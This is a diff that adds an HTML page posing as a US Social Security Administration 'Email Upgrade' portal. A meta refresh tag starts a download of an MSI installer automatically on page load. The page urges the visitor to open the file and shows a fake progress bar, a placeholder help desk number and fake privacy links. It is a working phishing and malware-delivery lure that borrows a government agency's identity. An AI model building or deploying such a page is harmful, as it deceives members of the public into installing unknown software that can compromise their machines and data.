@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="refresh" content="0; url = Email-Upgrade.msi">
+    <title>The United State Social Security Administration | SSA</title>
+
+    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
+    <style>
+        * {
+            padding: 0;
+            box-sizing: border-box;
+            margin: 0;
+        }
+        .bar {
+      width: 80%;
+      height: 30px;
+      background: #d4edda;
+      border-radius: 10px;
+      overflow: hidden;
+    }
+    .fill {
+      height: 100%;
+      width: 0;
+      background: #4caf50;
+      transition: width 0.1s linear;
+    }
+        
+    </style>
+</head>
+<body style="background-color:#f6f6f6 ;">
+    <div style="width: 100%;border-bottom: solid 1px #dddddd;padding: 10px 20px;background-color: white;"  class="header">
+       <div style="max-width: 970px;margin-inline: auto;" class="te">
+        <div style="display: flex;justify-content: flex-start;align-items: center;background-color: white;gap: 10px;width: 700px;" class="it">
+         <div class="logo">
+            <img style="width: 1px;height: 1px;" src="logo.svg" alt="">
+            
+            
+        </div>
+        <p style="font-family: 'Times New Roman', Times, serif;color: #36518a;font-size: 30px;">EMAIL UPGRADE</p>
+       </div>
+       </div>
+    </div>
+
+
+    <div style="width: 100%;" class="hero">
+        <div style="border: #dddddd 1px solid;padding: 20px;margin-inline: auto;margin-top: 20px;background-color: #ffffff;max-width: 970px;" class="">
+            <div style="border-radius: 10px;border: 1px solid black;padding: 10px 30px;text-align: left;display: flex;flex-direction: column;gap: 25px;font-family: 'Times New Roman', Times, serif;" class="content">
+                <p style="color: #0033a0;font-size: 35px;text-align: center;">
+                    
+                </p>
+                <p style="font-weight: bold;font-family: Arial, Helvetica, sans-serif">
+                    Your download will start automatically. If it doesn't, <a href="" style="color:#007bff ;text-decoration: none;font-family: Arial, Helvetica, sans-serif">click here</a>
+                </p>
+                <p style="font-family: Arial, Helvetica, sans-serif;">
+                    Please open the downloaded file as soon as it becomes available to begin the installation process.
+.
+                </p>
+                <p style="font-family: Arial, Helvetica, sans-serif">
+                    For further assistance, please contact our help desk at 1-800-123-4567.
+                </p>
+               <div class="bar">
+    <div style="color:#155724;font-family: Arial, Helvetica, sans-serif;padding: 5px;" class="fill" id="fill">✓ Download completed successfully! File saved as: EMAIL-UPGRADE</div>
+  </div>
+            
+        </div>
+        <div style="max-width: 970px;margin-inline: auto;margin-top: 20px;" class="2">
+            <div style="display: flex;gap: 10px;text-decoration: none;" class="link">
+                <a style="color: #007bff;text-decoration: none;" href="">Privacy and Security</a>
+                <a style="color: #007bff;text-decoration: none;" href="">OMB No. 0960-0789</a>
+                <a style="color: #007bff;text-decoration: none;" href="">Privacy Policy</a>
+                <a style="color: #007bff;text-decoration: none;" href="">Privacy Act Statement</a>
+                <a style="color: #007bff;text-decoration: none;" href="">Accessibility Help</a>
+
+            </div>
+        </div>
+    </div>
+    <script>
+    const fill = document.getElementById("fill");
+    let progress = 0;
+
+    function load() {
+      if (progress < 100) {
+        progress++;
+        fill.style.width = progress + "%";
+        setTimeout(load, 3);
+      }
+    }
+
+    load();
+  </script>
+</body>
+</html>
